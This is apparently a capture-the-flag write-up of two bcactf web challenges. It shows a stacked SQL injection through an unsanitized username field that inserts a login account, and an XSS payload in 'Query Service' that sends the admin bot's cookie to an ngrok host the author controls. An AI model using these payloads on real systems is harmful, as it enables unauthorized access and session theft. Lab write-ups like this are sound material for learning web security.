# Bloodthirsty Breeze

In this challenge the source is given and if we take a close look at those queries we can see that this query is not actually propertly sanitized :

```sql
SELECT * FROM users WHERE username = ? AND password = '${hashedPassword}';
```

But as we can see `hashedPassword` is not exploitable due to the fact that it's impossible to find a useful hash for the injection :

```js
const hashedPassword = (() => {
    const hash = createHash('md5');
    hash.update(password);
    return hash.digest().toString('base64');
})();
```

If we check other queries we find this :

```sql
INSERT INTO failed_logins VALUES ('${username}', '${hashedPassword}');
```

Oh... This is not sanitized and we can inject in the username parameter :). But let's see how we can do this, first we can check how the database was created :

```js
const newDatabase = async (): Promise<string> => {
    let id: string;
    do {
        id = randomBytes(32).toString('base64');
    } while (databases.has(id));

    const db = new Database(`:memory:`);

    await Promise.all([
        new Promise(
            (res, rej) => db.exec(
                "CREATE TABLE users (username TEXT, password TEXT);",
                (err) => err ? rej(err) : res(undefined)
            )
        ),
        new Promise(
            (res, rej) => db.exec(
                "CREATE TABLE failed_logins (username TEXT, password TEXT);",
                (err) => err ? rej(err) : res(undefined)
            )
        ),
    ]);
```

Two tables was created, we can append a second query and insert into the `users` table data. In `index.ts` we can see that the flag is in `/api/menu`:

```js
server.get("/api/menu", cookieParser(), async (req, res) => {
    try {
        if (!databases.has(req.cookies.id)) res.cookie("id", await newDatabase(), {
            expires: new Date(new Date().getTime() + idTimeoutMillis),
        });

        if (!req.cookies.auth) {
            res.status(401);
            res.send(
                'The Bloodthirsty Breeze is interested in devouring your user data. Therefore, The Bloodthirsty Breeze requires that all visitors log in to view the menu, 
to maximize data collection efficiency.');
            return;
        }

        const authToken = req.cookies.auth;
        if (authTokens.has(authToken)) {
            const randIndex = Math.floor(Math.random() * menu.length);
            const result = menu.map((item, i) => ({ ...item, description: i === randIndex ? flag : item.description }));
            res.json(result);
        } else {
            res.status(401);
            res.send("Hacking The Bloodthirsty Breeze isn't a breeze, you know. Try harder.");
        }
    } catch (e) {
        reportError(res, e);
    }
});
```

The flag is shown here but we must be authenticated, but we can't register our user because the site is under construction... Oh wait, sure we can't? As we have seen we can 
probably perform queries to the database and we could register our user. But firts we have to see again how the hash is saved : 

```js
const hashedPassword = (() => {
    const hash = createHash('md5');
    hash.update(password);
    return hash.digest().toString('base64');
})();
```

The password first is hashed to MD5 and then base64 encoded, let's try to build our payload :) :

```sql
username','foo');INSERT INTO users VALUES ('whoami', 'GwZ5vnKtl2rV1JGtV6XuwA=='); -- 
```

note : I used the same function to get the `hashedPassword` :

```js
import { createHash } from "crypto";

const hashedPassword = (() => {
    const hash = createHash('md5');
    hash.update('whoami');
    return hash.digest().toString('base64');
})();
console.log(hashedPassword);
```

Let's try to login with the payload and then login again using `whoami:whoami` : 

```json
{"name":"Crypto-Locker","description":"bcactf{said_forbidden_word_y3ysyGn2R0UwuoceJ5uyMg}","price":"1 
BTC","imageURL":"https://images.pexels.com/photos/735911/pexels-photo-735911.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2"}
```

> bcactf{said_forbidden_word_y3ysyGn2R0UwuoceJ5uyMg}

# Query Service

In this challenge we can query the database, after few tries we realize that it is SQLite : 

`SELECT name FROM sqlite_master`

```
name
notes
```

`SELECT * FROM notes`
```
note
submit link to admin bot at http://webp.bcactf.com:49155/
the flag is in the bot's "flag" cookie
```

Oh this is an XSS, we can send the query link to the admin, we can call an alert using `SELECT '<img src=x onerror=alert(1)>'` :

![image](https://user-images.githubusercontent.com/76447395/173060899-e90cfc93-c4a0-4369-8ca6-e2a78e2d55bf.png)

Nice, works! Let's try to steal the admin's cookie :

`SELECT '<img src=x onerror=this.src="https://[...].ngrok.io/?"+document.cookie>'`

> http://webp.bcactf.com:49156/?query=SELECT%20%27%3Cimg%20src=x%20onerror=this.src=%22https://8401-88-22-87-143.ngrok.io/?%22+document.cookie%3E%27

Now just check our ngrok : 

```
 [404]: GET /?flag=bcactf{SUBM1TT3D_QUE5TI0NABL3_L1NK} - No such file or directory
```

> bcactf{SUBM1TT3D_QUE5TI0NABL3_L1NK}
